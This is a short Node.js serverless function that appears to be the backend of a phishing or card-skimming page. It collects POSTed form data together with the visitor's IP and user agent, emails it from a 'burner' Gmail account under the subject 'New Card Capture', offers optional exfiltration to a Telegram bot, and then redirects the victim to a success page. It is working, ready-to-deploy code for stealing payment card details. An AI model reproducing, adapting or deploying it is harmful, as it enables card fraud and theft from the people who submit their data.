const nodemailer = require('nodemailer');
const handler = async (event) => {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Method Not Allowed' };
  }

  const data = JSON.parse(event.body);
  data.ip = event.headers['x-forwarded-for'] || 'Unknown';
  data.userAgent = event.headers['user-agent'] || 'Unknown';
  data.timestamp = new Date().toISOString();

  // Email the data
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'yourburner@gmail.com', // Your burner Gmail
      pass: 'your_app_password'     // Gmail app password (generate in Google Account settings)
    }
  });

  await transporter.sendMail({
    from: 'noreply@yourdomain.com',
    to: 'yourreceivingemail@example.com', // Where captures are sent
    subject: 'New Card Capture',
    text: JSON.stringify(data, null, 2)
  });

  // Optional: Send to Telegram (uncomment and add your details)
  // const botToken = 'YOUR_BOT_TOKEN';
  // const chatId = 'YOUR_CHAT_ID';
  // await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(JSON.stringify(data, null, 2))}`);

  // Redirect to success.html
  return {
    statusCode: 302,
    headers: { Location: '/success.html' },
    body: ''
  };
};

exports.handler = handler;
